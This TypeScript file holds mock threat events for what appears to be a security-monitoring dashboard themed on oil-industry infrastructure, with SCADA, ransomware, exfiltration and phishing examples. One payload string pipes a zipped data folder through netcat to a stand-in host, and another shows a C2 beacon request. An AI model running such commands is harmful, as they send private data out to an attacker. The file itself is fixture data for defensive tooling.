import { ThreatEvent } from './types';

export const MOCK_THREATS: ThreatEvent[] = [
  {
    id: 'TH-001',
    timestamp: new Date().toISOString(),
    source: 'EdgeNode_Camaçari_VLAN40',
    type: 'SCADA_LATERAL_MOVEMENT',
    severity: 'CRITICAL',
    description: 'Unrecognized lateral movement detected targeting Siemens S7-1500 PLC controlling oil flow pressure.',
    payload: '0x34 0xFA 0x22 ... [ENCRYPTED_PACKET_SIGNATURE]',
    mitigation: 'Isolate Subnet, Initiate Zero-Trust Port Blocking.'
  },
  {
    id: 'TH-002',
    timestamp: new Date().toISOString(),
    source: 'Refinaria_Abreu_e_Lima_WAN',
    type: 'RANSOMWARE_BEACONING',
    severity: 'HIGH',
    description: 'Outbound command-and-control (C2) traffic detected towards known LockBit 3.0 dark-web proxies.',
    payload: 'GET /v1/auth?k=9933 ... Host: onion-proxy-7722.xyz',
    mitigation: 'Block IP range, Execute Endpoint Forensic Acquisition.'
  },
  {
    id: 'TH-003',
    timestamp: new Date().toISOString(),
    source: 'Santos_Basin_FPSO_IoT',
    type: 'DLP_EXFILTRATION',
    severity: 'MEDIUM',
    description: 'Atypical data egress volume from geological reservoir modeling server (4.2GB in 30s).',
    payload: 'zip -r data.zip /mnt/geo/data ... | nc exfil.ru 8080',
    mitigation: 'Apply Rate Limiting, Authenticate Data Owner.'
  },
  {
    id: 'TH-004',
    timestamp: new Date().toISOString(),
    source: 'Corporate_VP_Mail_Gateway',
    type: 'PHISHING_AI_ENHANCED',
    severity: 'HIGH',
    description: 'Spear-phishing attempt targeting C-Level executives using voice-cloned deepfake credentials.',
    payload: 'Subject: URGENT: Q3 Financial Authorization ... attachment: auth_token.zip',
    mitigation: 'Quarantine Email, Notify Security Training Team.'
  }
];

export const AGENT_LIST = ['Supervisor', 'Edge_DLP', 'RAG_Intel', 'CLevel_Reporter', 'Threat_Hunter', 'Recovery_Engine'];
